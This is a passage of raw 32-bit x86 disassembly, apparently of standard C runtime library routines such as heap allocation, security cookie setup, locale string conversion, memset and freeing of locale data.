  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
